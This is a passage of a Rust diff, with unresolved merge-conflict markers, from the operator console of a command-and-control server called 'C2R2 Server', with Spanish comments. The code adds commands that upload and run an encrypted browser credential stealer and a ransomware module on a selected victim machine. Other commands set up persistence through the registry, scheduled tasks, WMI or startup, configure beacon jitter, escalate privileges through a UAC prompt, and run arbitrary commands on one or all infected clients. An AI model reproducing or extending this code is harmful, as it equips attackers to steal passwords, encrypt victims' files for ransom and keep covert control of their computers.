+                            let dll_data = match fs::read(stealer_enc_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo stealer.enc: {}", "".bright_red(), e);
+                                    continue;
+                                }
+                            };
+
+                            let key_data = match fs::read(stealer_key_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo stealer.key: {}", "".bright_red(), e);
+                                    continue;
+                                }
+                            };
+
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_red());
+                            println!("{}", format!("║            HARVESTING CREDENTIALS [{}]", id).bright_red().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_red());
+                            println!();
+                            println!("{}", "   Subiendo stealer.enc...".bright_yellow());
+
+                            // Subir DLL encriptada
+                            let encoded_dll = base64_encode(&dll_data);
+                            let upload_dll_cmd = format!("__UPLOAD__|stealer.enc|{}", encoded_dll);
+                            if let Err(e) = client.tx.send(upload_dll_cmd) {
+                                error!("[{}] Error enviando stealer.enc: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                                continue;
+                            }
+
+                            // Esperar un poco para que se suba
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+
+                            println!("{}", "  � Subiendo stealer.key...".bright_yellow());
+
+                            // Subir clave
+                            let encoded_key = base64_encode(&key_data);
+                            let upload_key_cmd = format!("__UPLOAD__|stealer.key|{}", encoded_key);
+                            if let Err(e) = client.tx.send(upload_key_cmd) {
+                                error!("[{}] Error enviando stealer.key: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                                continue;
+                            }
+
+                            // Esperar un poco
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+
+                            println!("{}", "   Ejecutando stealer...".bright_yellow());
+                            println!("{}", "   Chrome, Edge, Firefox, Brave, Opera".bright_white().dimmed());
+                            println!("{}", "  ⏳ Esperando credenciales...".bright_white().dimmed());
+                            println!();
+
+                            // Enviar comando de harvest
+                            if let Err(e) = client.tx.send("__HARVEST__".to_string()) {
+                                error!("[{}] Error enviando comando __HARVEST__: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", " No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/encrypt" => {
+                    if parts.len() < 2 {
+                        println!("{}  /encrypt <ruta> [max_depth]", " Uso:".bright_red());
+                        println!("   Ejemplo: /encrypt C:\\\\Users\\\\Victim\\\\Documents 5");
+                        continue;
+                    }
+
+                    // Extraer path y max_depth correctamente
+                    let (path, max_depth) = if parts.len() > 2 && parts[parts.len() - 1].parse::<u32>().is_ok() {
+                        // Último argumento es un número (max_depth)
+                        (parts[1..parts.len() - 1].join(" "), parts[parts.len() - 1].as_str())
+                    } else {
+                        // Sin max_depth, usar todo como path
+                        (parts[1..].join(" "), "5")
+                    };
+
+                    let selected = *selected_client.lock().unwrap();
+
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /encrypt: Encriptando archivos en {}", id, path);
+
+                            // Verificar que existan los archivos del módulo
+                            let modules_dir = get_modules_path();
+                            let ransomware_enc_path = modules_dir.join("ransomware.enc");
+                            let ransomware_key_path = modules_dir.join("ransomware.key");
+
+                            if !ransomware_enc_path.exists() || !ransomware_key_path.exists() {
+                                println!("{}", " Error: Módulo ransomware no encontrado".bright_red());
+                                println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module --module ransomware".bright_yellow());
+                                continue;
+                            }
+
+                            // Leer archivos
+                            let dll_data = match fs::read(&ransomware_enc_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo ransomware.enc: {}", "".bright_red(), e);
+                                    continue;
+                                }
+                            };
+
+                            let key_data = match fs::read(&ransomware_key_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo ransomware.key: {}", "".bright_red(), e);
+                                    continue;
+                                }
+                            };
+
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_red());
+                            println!("{}", format!("║            ENCRYPTING FILES [{}]", id).bright_red().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_red());
+                            println!();
+                            println!("{}", "   Subiendo ransomware.enc...".bright_yellow());
+
+                            // Subir DLL encriptada
+                            let encoded_dll = base64_encode(&dll_data);
+                            let upload_dll_cmd = format!("__UPLOAD__|ransomware.enc|{}", encoded_dll);
+                            if let Err(e) = client.tx.send(upload_dll_cmd) {
+                                error!("[{}] Error enviando ransomware.enc: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                                continue;
+                            }
+
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+
+                            println!("{}", "   Subiendo ransomware.key...".bright_yellow());
+
+                            // Subir clave
+                            let encoded_key = base64_encode(&key_data);
+                            let upload_key_cmd = format!("__UPLOAD__|ransomware.key|{}", encoded_key);
+                            if let Err(e) = client.tx.send(upload_key_cmd) {
+                                error!("[{}] Error enviando ransomware.key: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                                continue;
+                            }
+
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+
+                            println!("{}", "   Ejecutando encriptación...".bright_yellow());
+                            println!();
+
+                            // Ejecutar ransomware
+                            let encrypt_cmd = format!("__ENCRYPT__:{}|{}", path, max_depth);
+                            if let Err(e) = client.tx.send(encrypt_cmd) {
+                                error!("[{}] Error enviando comando __ENCRYPT__: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", " No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/decrypt" => {
+                    if parts.len() < 3 {
+                        println!("{} /decrypt <ruta> <key> [max_depth]", " Uso:".bright_red());
+                        println!("   Ejemplo: /decrypt C:\\\\Users\\\\Victim\\\\Documents abc123... 5");
+                        continue;
+                    }
+
+                    // Parsear argumentos: necesitamos separar path, key y max_depth opcional
+                    // Formato: /decrypt <path> <key> [max_depth]
+                    // El key es una string sin espacios (hash hex)
+                    // max_depth es un número opcional al final
+
+                    // Verificar si el último argumento es max_depth (número)
+                    let (path_and_key, max_depth) = if parts.len() > 3 && parts[parts.len() - 1].parse::<u32>().is_ok() {
+                        (&parts[1..parts.len() - 1], parts[parts.len() - 1].as_str())
+                    } else {
+                        (&parts[1..], "5")
+                    };
+
+                    // El último elemento de path_and_key es el key (sin espacios)
+                    // Todo lo anterior es el path (puede tener espacios)
+                    if path_and_key.len() < 2 {
+                        println!("{} Debe especificar ruta y clave", " Error:".bright_red());
+                        continue;
+                    }
+
+                    let key = &path_and_key[path_and_key.len() - 1];
+                    let path = path_and_key[..path_and_key.len() - 1].join(" ");
+
+                    // Debug: mostrar qué se parseó
+                    println!("DEBUG: path='{}', key='{}', max_depth='{}'", path, key, max_depth);
+
+                    let selected = *selected_client.lock().unwrap();
+
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /decrypt: Desencriptando archivos en {}", id, path);
+
+                            // Verificar que existan los archivos del módulo
+                            let modules_dir = get_modules_path();
+                            let ransomware_enc_path = modules_dir.join("ransomware.enc");
+                            let ransomware_key_path = modules_dir.join("ransomware.key");
+
+                            if !ransomware_enc_path.exists() || !ransomware_key_path.exists() {
+                                println!("{}", " Error: Módulo ransomware no encontrado".bright_red());
+                                println!("{}", "   Genera el módulo con: cargo run -p builder -- encrypt-module --module ransomware".bright_yellow());
+                                continue;
+                            }
+
+                            // Leer archivos
+                            let dll_data = match fs::read(&ransomware_enc_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo ransomware.enc: {}", "".bright_red(), e);
+                                    continue;
+                                }
+                            };
+
+                            let key_data = match fs::read(&ransomware_key_path) {
+                                Ok(data) => data,
+                                Err(e) => {
+                                    println!("{} Error leyendo ransomware.key: {}", "".bright_red(), e);
+                                    continue;
+                                }
+                            };
+
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_green());
+                            println!("{}", format!("║            DECRYPTING FILES [{}]", id).bright_green().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_green());
+                            println!();
+                            println!("{}", "   Subiendo ransomware.enc...".bright_yellow());
+
+                            // Subir DLL encriptada
+                            let encoded_dll = base64_encode(&dll_data);
+                            let upload_dll_cmd = format!("__UPLOAD__|ransomware.enc|{}", encoded_dll);
+                            if let Err(e) = client.tx.send(upload_dll_cmd) {
+                                error!("[{}] Error enviando ransomware.enc: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                                continue;
+                            }
+
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+
+                            println!("{}", "   Subiendo ransomware.key...".bright_yellow());
+
+                            // Subir clave
+                            let encoded_key = base64_encode(&key_data);
+                            let upload_key_cmd = format!("__UPLOAD__|ransomware.key|{}", encoded_key);
+                            if let Err(e) = client.tx.send(upload_key_cmd) {
+                                error!("[{}] Error enviando ransomware.key: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                                continue;
+                            }
+
+                            std::thread::sleep(std::time::Duration::from_millis(200));
+
+                            println!("{}", "   Ejecutando desencriptación...".bright_yellow());
+                            println!();
+
+                            // Ejecutar desencriptación
+                            let decrypt_cmd = format!("__DECRYPT__:{}|{}|{}", path, key, max_depth);
+                            if let Err(e) = client.tx.send(decrypt_cmd) {
+                                error!("[{}] Error enviando comando __DECRYPT__: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", " No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/persist" => {
+                    if parts.len() < 2 {
+                        println!("{} /persist <method>", " Uso:".bright_red());
+                        println!("   Métodos: registry, task, wmi, startup");
+                        continue;
+                    }
+
+                    let method = &parts[1];
+                    let selected = *selected_client.lock().unwrap();
+
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /persist: método {}", id, method);
+
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_magenta());
+                            println!("{}", format!("║         ESTABLECIENDO PERSISTENCIA [{}]", id).bright_magenta().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_magenta());
+                            println!();
+                            println!("{}", format!("   Método: {}", method).bright_yellow());
+                            println!("{}", "  ⏳ Esperando confirmación...".bright_white().dimmed());
+                            println!();
+
+                            let persist_cmd = format!("__PERSIST__:{}", method);
+                            if let Err(e) = client.tx.send(persist_cmd) {
+                                error!("[{}] Error enviando comando __PERSIST__: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", " No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/persist_remove" => {
+                    let selected = *selected_client.lock().unwrap();
+
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /persist_remove: Removiendo persistencia", id);
+
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_yellow());
+                            println!("{}", format!("║           REMOVIENDO PERSISTENCIA [{}]", id).bright_yellow().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_yellow());
+                            println!();
+                            println!("{}", "  ⏳ Limpiando...".bright_white().dimmed());
+                            println!();
+
+                            if let Err(e) = client.tx.send("__PERSIST_REMOVE__".to_string()) {
+                                error!("[{}] Error enviando comando __PERSIST_REMOVE__: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", " No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/beacon" => {
+                    if parts.len() < 2 {
+                        println!("{} /beacon <interval:jitter>", " Uso:".bright_red());
+                        println!("   Ejemplo: /beacon 60:30  (60 segundos con ±30% jitter)");
+                        continue;
+                    }
+
+                    let config = &parts[1];
+                    let selected = *selected_client.lock().unwrap();
+
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /beacon: configuración {}", id, config);
+
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_blue());
+                            println!("{}", format!("║         CONFIGURANDO BEACON [{}]", id).bright_blue().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_blue());
+                            println!();
+                            println!("{}", format!("   Config: {}", config).bright_yellow());
+                            println!("{}", "  ℹ  Se aplicará en la próxima reconexión".bright_white().dimmed());
+                            println!();
+
+                            let beacon_cmd = format!("__BEACON__:{}", config);
+                            if let Err(e) = client.tx.send(beacon_cmd) {
+                                error!("[{}] Error enviando comando __BEACON__: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", " No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/elevate" => {
+                    let selected = *selected_client.lock().unwrap();
+
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+
+                        if let Some(client) = clients.get(&id) {
+                            info!("[{}] Comando /elevate: Re-ejecutando agente con privilegios admin", id);
+
+                            println!();
+                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_red());
+                            println!("{}", format!("║      ⬆  ELEVANDO AGENTE A ADMIN [{}]", id).bright_red().bold());
+                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_red());
+                            println!();
+                            println!("{}", "   Re-ejecutando agente con privilegios elevados...".bright_yellow());
+                            println!("{}", "    Se mostrará UAC prompt al usuario".bright_white().dimmed());
+                            println!("{}", "   El agente actual se desconectará y el elevado se reconectará".bright_white().dimmed());
+                            println!();
+
+                            let elevate_cmd = "__ELEVATE__".to_string();
+                            if let Err(e) = client.tx.send(elevate_cmd) {
+                                error!("[{}] Error enviando comando __ELEVATE__: {}", id, e);
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", " No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/cmd" => {
+                    if parts.len() < 2 {
+                        println!("{} /cmd <comando>", " Uso:".bright_red());
+                        continue;
+                    }
+
+                    let command = reconstruct_command(&parts[1..]);
+                    let selected = *selected_client.lock().unwrap();
+
+                    if let Some(id) = selected {
+                        let clients = clients.lock().unwrap();
+
+                        if let Some(client) = clients.get(&id) {
+                            if let Err(e) = client.tx.send(command.clone()) {
+                                println!("{} {}", " Error:".bright_red().bold(), e);
+                            } else {
+                                println!("{} {} → {}",
+                                    "".bright_blue(),
+                                    format!("[{}]", id).bright_cyan().bold(),
+                                    command.bright_white()
+                                );
+                            }
+                        } else {
+                            println!("{} Cliente {} desconectado", "".bright_red(), id);
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("{}", " No hay cliente seleccionado. Usa /select <id>".bright_red());
+                    }
+                }
+                "/cmd_all" => {
+                    if parts.len() < 2 {
+                        println!("{} /cmd_all <comando>", " Uso:".bright_red());
+                        continue;
+                    }
+
+                    let command = reconstruct_command(&parts[1..]);
+                    let clients = clients.lock().unwrap();
+
+                    info!("Comando /cmd_all: {} (a {} clientes)", command, clients.len());
+
+                    if clients.is_empty() {
+                        println!("{}", " No hay clientes conectados".bright_red());
+                    } else {
+                        let mut count = 0;
+                        for (id, client) in clients.iter() {
+                            if client.tx.send(command.clone()).is_ok() {
+                                println!("{} {} → {}",
+                                    "�".bright_magenta(),
+                                    format!("[{}]", id).bright_cyan().bold(),
+                                    command.bright_white().dimmed()
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                                 );
                                 println!(
                                     "{}",
@@ -1601,6 +2465,7 @@ async fn main() {
                         } else {
                             println!("{} ID inválido", "❌".bright_red());
                         }
+<<<<<<< HEAD
                     }
                     "/deselect" => {
                         *selected_client.lock().unwrap() = None;
@@ -2494,15 +3359,41 @@ async fn main() {
                             "/help".bright_cyan()
                         );
                     }
+=======
+                        println!("{} Enviado a {} cliente(s)", "".bright_green(), count.to_string().bright_cyan().bold());
+                    }
+                }
+                "/exit" | "/quit" => {
+                    println!();
+                    println!("{}", " Cerrando C2R2 Server...".bright_yellow().bold());
+                    println!();
+                    info!("═══════════════════════════════════════════════════════════");
+                    info!("Server cerrado por comando /exit del operador");
+                    info!("═══════════════════════════════════════════════════════════");
+                    // Guardar historial antes de salir
+                    let _ = rl.save_history(history_file);
+                    std::process::exit(0);
+                }
+                _ => {
+                    println!("{} Comando '{}' desconocido. Usa {}",
+                        "".bright_red(),
+                        parts[0].bright_yellow(),
+                        "/help".bright_cyan()
+                    );
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                 }
             }
             Err(ReadlineError::Interrupted) => {
                 // Ctrl+C presionado
                 println!();
+<<<<<<< HEAD
                 println!(
                     "{}",
                     "👋 Cerrando C2R2 Server... (Ctrl+C)".bright_yellow().bold()
                 );
+=======
+                println!("{}", " Cerrando C2R2 Server... (Ctrl+C)".bright_yellow().bold());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                 info!("═══════════════════════════════════════════════════════════");
                 info!("Server cerrado por Ctrl+C del operador");
                 info!("═══════════════════════════════════════════════════════════");
@@ -2512,10 +3403,14 @@ async fn main() {
             Err(ReadlineError::Eof) => {
                 // Ctrl+D presionado
                 println!();
+<<<<<<< HEAD
                 println!(
                     "{}",
                     "👋 Cerrando C2R2 Server... (Ctrl+D)".bright_yellow().bold()
                 );
+=======
+                println!("{}", " Cerrando C2R2 Server... (Ctrl+D)".bright_yellow().bold());
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                 info!("═══════════════════════════════════════════════════════════");
                 info!("Server cerrado por Ctrl+D del operador");
                 info!("═══════════════════════════════════════════════════════════");
@@ -2523,7 +3418,7 @@ async fn main() {
                 std::process::exit(0);
             }
             Err(err) => {
-                eprintln!("{} Error: {:?}", "❌".bright_red(), err);
+                eprintln!("{} Error: {:?}", "".bright_red(), err);
                 break;
             }
         }
